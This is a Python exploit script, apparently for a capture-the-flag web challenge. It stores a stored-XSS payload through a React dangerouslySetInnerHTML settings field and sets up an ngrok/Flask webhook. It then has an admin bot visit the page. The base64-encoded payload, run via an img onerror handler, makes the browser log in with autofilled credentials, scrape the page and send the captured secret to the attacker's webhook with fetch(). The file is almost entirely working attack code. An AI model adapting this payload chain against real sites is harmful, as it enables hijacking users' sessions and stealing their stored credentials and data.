import requests
from pyngrok import ngrok
import sys

s = requests.Session()
# ignore cert errors
s.verify = False

# check for LOCAL or REMOTE
local = sys.argv[1] != 'remote' if len(sys.argv) > 1 else True

bot_url = "http://localhost:5001"
if not local:
    bot_url = "https://bot.completely-dangerous.ctf.towerofhanoi.it"
app_url = "https://localhost:5000"
if not local:
    app_url = "https://completely-dangerous.ctf.towerofhanoi.it"

ngrok_tunnel = ngrok.connect(5050)
webhook_url = ngrok_tunnel.public_url

username='xssthis'
password='xssthisandmorenonrandomwords'

# listen to connections on port 5050
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/x', methods=['GET'])
def x():
    bot_credentials_app_url = "https://chall:5000" if local else app_url
    return render_template('x.html', username=username, password=password, app_url=bot_credentials_app_url)

# Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5050}, daemon=True).start()

import base64
from threading import Thread

def encode_base64(data):
    """Encode data to base64."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data).decode('utf-8')

xss_payload = f"""<script>
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
(async () => {{
    w = window.open('/')
    await sleep(1000);
    logoutbtn = w.document.getElementsByClassName('logout-btn')
    if (logoutbtn.length > 0) {{
        // click logout button if exists
        w.document.getElementsByClassName('logout-btn')[0].click();
        await sleep(500);
    }}
    // look for <a href="/login">Login</a> tag and click it
    w.document.querySelector('a[href="/login"]').click();
    // wait for autofill
    await sleep(1000);
    w.document.getElementsByClassName('btn')[0].click();
    // wait for redirect / login
    await sleep(1000);
    // extract flag from body
    const body = w.document.body.innerHTML;
    const flagMatch = body.match(/toh\\{{([^}}]+)\\}}/);
    if (flagMatch) {{
        const flag = flagMatch[1];
        fetch('{webhook_url}/?flag=' + encodeURIComponent(flag), {{ 'mode': 'no-cors' }});
    }} else {{
        console.error('Flag not found in body:', body);
    }}
}})();
</script>
"""

def store_xss_payload():
    # assuming session has user authentication
    # Create settings with XSS payload
    payload = {
        "displayName": {
            # "children": "",
            # "style": {"color": "red"},
            "dangerouslySetInnerHTML": {
                "__html": "<img onerror=document.write(atob(\"" + encode_base64(xss_payload) + "\")) src='invalid-image' />"
            }
        }
    }
    response = s.post(f"{app_url}/api/settings", json=payload)
    if response.status_code == 200:
        print("XSS payload stored successfully.")
    else:
        print(f"Failed to store XSS payload. Status code: {response.status_code}")
        print("Response:", response.text)
    return response

def register(username, password):
    # Register a new user
    payload = {
        "username": username,
        "password": password
    }
    response = s.post(f"{app_url}/api/register", json=payload)
    if response.status_code == 201:
        print("User registered successfully.")
    else:
        print(f"Failed to register user. Status code: {response.status_code}")
        print("Response:", response.text)
    return response

def login(username, password):
    # Login the user
    payload = {
        "username": username,
        "password": password
    }
    response = s.post(f"{app_url}/api/login", json=payload)
    if response.status_code == 200:
        print("User logged in successfully.")
        print("Token:", response.cookies.get("auth-token"))
    else:
        print(f"Failed to login. Status code: {response.status_code}")
        print("Response:", response.text)
    return response

def bot_visit(url):
    # Visit the bot URL
    response = requests.post(f"{bot_url}/visit", json={"url": url})
    if response.status_code == 200:
        print(f"Bot visited {url} successfully.")
        print("Response:", response.text)
    else:
        print(f"Failed to visit {url}. Status code: {response.status_code}")
        print("Response:", response.text)
    return response


def exploit():
    global username, password

    register(username, password)
    login(username, password)
    store_xss_payload()
    bot_visit(f"{webhook_url}/x")


if __name__ == "__main__":
    print("Starting exploit...")
    Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5050}, daemon=True).start()
    exploit()
    print('Listening for flag in webhook...')
    # sleep until the flag is received
    import time
    time.sleep(100)  # wait for 100 seconds
    print('Exiting...')
